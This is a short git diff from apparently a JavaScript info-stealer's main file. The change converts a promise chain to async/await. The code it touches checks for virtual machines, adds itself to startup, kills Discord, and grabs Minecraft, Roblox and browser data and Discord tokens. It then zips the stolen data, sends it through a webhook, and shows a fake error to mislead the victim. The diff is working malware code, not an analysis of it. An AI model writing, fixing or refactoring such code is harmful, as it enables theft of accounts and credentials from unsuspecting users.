@@ -20,17 +20,17 @@ if (config.vmProtect && checkVM()) {
   }
 } else {
   // Download executables to decrypt tokens then start the thing
-  require('./functions/download')().then(() => {
+  require('./functions/download')().then(async () => {
     if (config.addToStartup && runningFromExecutable()) require('./functions/startup');
     config.discord.killProcess && require('./functions/kill-discord');
     require('./functions/grab-mc');
     require('./functions/grab-roblox');
     require('./functions/grab-browsers-data');
 
-    require('./functions/grab-discord-token').then(async () => {
-      await sleep(500);
-      require('./functions/zip').then(require('./functions/webhook'));
-    });
+    await require('./functions/grab-discord-token');
+    await sleep(500);
+    require('./functions/zip').then(await require('./functions/webhook'));
+
     config.fakeError && require('./functions/fake-error');
   });
 }
